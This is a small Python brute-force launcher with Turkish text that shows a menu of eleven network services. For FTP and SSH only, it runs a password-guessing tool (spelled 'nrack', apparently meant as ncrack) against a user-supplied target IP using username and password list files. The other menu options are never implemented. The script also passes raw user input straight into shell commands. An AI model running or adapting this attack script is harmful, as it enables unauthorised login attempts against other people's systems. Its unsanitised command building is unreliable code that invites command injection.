#!/usr/bin/env python

import os 
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet KABA KUVVET")
print("""
Kaba Kuvvet Aracına Hoş Geldiniz...

1) FTP
2) SSH
3) Telnet
4) HTTP
5) SMB
6) RDP
7) SIP
8) Redis
9) VNC
10) PostgreSQL
11) MySQL

""")

islemno = input("İşlem Numarasını Giriniz: ")
hedefip = input("Hedef İp Giriniz: ")
kullaniciadi = input("Kullanıcı Adı Dosya Yolu: ")
sifre = input("Şifrelerin Bulunduğu Dosya Yolu: ")

if(islemno == "1"):
	os.system("nrack -p 21 -u " + kullaniciadi + " -P " + sifre + " " + hedefip)
elif(islemno == "2"):
	os.system("nrack -p 22 -u " + kullaniciadi + " -P " + sifre + " " + hedefip)
else:
	print("Hatalı Giriş Yaptınız...")
